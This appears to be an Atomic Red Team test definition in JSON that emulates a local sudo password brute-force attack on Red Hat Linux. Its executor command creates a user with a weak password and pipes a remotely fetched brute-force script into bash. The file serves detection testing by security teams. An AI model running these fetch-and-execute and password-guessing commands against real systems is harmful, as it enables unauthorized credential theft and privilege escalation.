{
    "name": "SUDO Brute Force - Redhat",
    "description": "An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user.   This test creates the art user with a password of password123, logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user ",
    "supported_platforms": [
        "linux"
    ],
    "dependency_executor_name": "bash",
    "executor": {
        "name": "bash",
        "elevation_required": true,
        "command": "useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art\nsu art\ncd /tmp\ncurl -s #{remote_url} |bash\n",
        "cleanup_command": "userdel -fr art\n",
        "type": "Command Executor"
    },
    "id": "T1110.001",
    "tactics": [
        "Credential Access"
    ],
    "technique": "Password Guessing",
    "source": "ART",
    "uuid": "4097bc00-5eeb-4d56-aaf9-287d60351d95",
    "arguments": {
        "remote_url": {
            "description": "url of remote payload",
            "type": "url",
            "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh"
        }
    },
    "preconditions": [
        {
            "description": "Check if running on a Redhat based machine.\n",
            "prereq_command": "if grep -iq \"rhel\\|fedora\\|centos\" /usr/lib/os-release; then echo \"RedHat\"; else echo \"NOT RedHat\"; exit 1; fi\nif grep -Rq \"pam_faillock\" /etc/pam.d/*; then echo \"pam_faillock configured\"; exit 1; fi\nif [ -x \"$(command -v openssl)\" ]; then echo \"openssl is installed\"; else echo \"openssl is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v sudo)\" ]; then echo \"sudo is installed\"; else echo \"sudo is NOT installed\"; exit 1; fi\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
            "get_prereq_command": "yum update && yum install -y openssl sudo curl\n"
        }
    ],
    "infrastructure_requirement": [],
    "side": "Victim"
}